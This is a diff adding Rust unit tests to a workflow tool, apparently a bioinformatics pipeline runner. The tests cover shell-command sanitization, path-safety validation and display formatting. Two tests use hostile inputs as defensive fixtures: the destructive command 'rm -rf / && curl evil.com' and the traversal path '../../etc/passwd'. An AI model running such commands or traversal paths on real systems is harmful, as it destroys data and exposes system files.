@@ -1441,4 +1441,56 @@ mod tests {
             _ => panic!("expected WorkflowCompleted"),
         }
     }
+
+    #[test]
+    fn sanitize_shell_safe_command() {
+        let warnings =
+            sanitize_shell_command("bwa mem ref.fa reads.fq | samtools sort > aligned.bam");
+        assert!(warnings.iter().any(|w| w.contains("Pipe")));
+    }
+
+    #[test]
+    fn sanitize_shell_dangerous_command() {
+        let warnings = sanitize_shell_command("rm -rf / && curl evil.com");
+        assert!(warnings.iter().any(|w| w.contains("recursive deletion")));
+        assert!(warnings.iter().any(|w| w.contains("curl")));
+    }
+
+    #[test]
+    fn validate_path_safe() {
+        let workdir = std::path::Path::new("/work");
+        assert!(validate_path_safety(workdir, "output/result.txt").is_ok());
+    }
+
+    #[test]
+    fn validate_path_traversal() {
+        let workdir = std::path::Path::new("/work");
+        assert!(validate_path_safety(workdir, "../../etc/passwd").is_err());
+    }
+
+    #[test]
+    fn job_status_display_all_variants() {
+        assert_eq!(JobStatus::Pending.to_string(), "pending");
+        assert_eq!(JobStatus::Success.to_string(), "success");
+        assert_eq!(JobStatus::Failed.to_string(), "failed");
+    }
+
+    #[test]
+    fn execution_provenance_display() {
+        let prov = ExecutionProvenance {
+            oxo_flow_version: "0.1.0".to_string(),
+            config_checksum: "abc123".to_string(),
+            started_at: Utc::now(),
+            finished_at: None,
+            hostname: "testhost".to_string(),
+            workdir: "/work".to_string(),
+            operator_id: None,
+            instrument_id: None,
+            reagent_lot: None,
+            specimen_id: None,
+        };
+        let s = prov.to_string();
+        assert!(s.contains("0.1.0"));
+        assert!(s.contains("testhost"));
+    }
 }
